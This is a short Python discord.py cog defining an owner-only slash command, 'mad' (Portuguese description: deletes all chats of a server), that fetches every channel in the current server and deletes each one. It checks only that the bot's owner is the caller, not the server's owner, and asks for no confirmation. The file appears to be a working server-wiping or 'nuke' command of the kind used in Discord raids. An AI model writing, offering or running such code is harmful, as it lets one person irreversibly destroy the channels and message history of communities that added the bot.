import discord
from discord.ext import commands

class Mad(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name="mad", description="Apaga todos os chats de um servidor")
    @commands.is_owner()
    async def self_destruction(self, ctx):
        channels_list = await ctx.guild.fetch_channels()
        for channel in channels_list:
            await channel.delete()

def setup(bot):
    bot.add_cog(Mad(bot))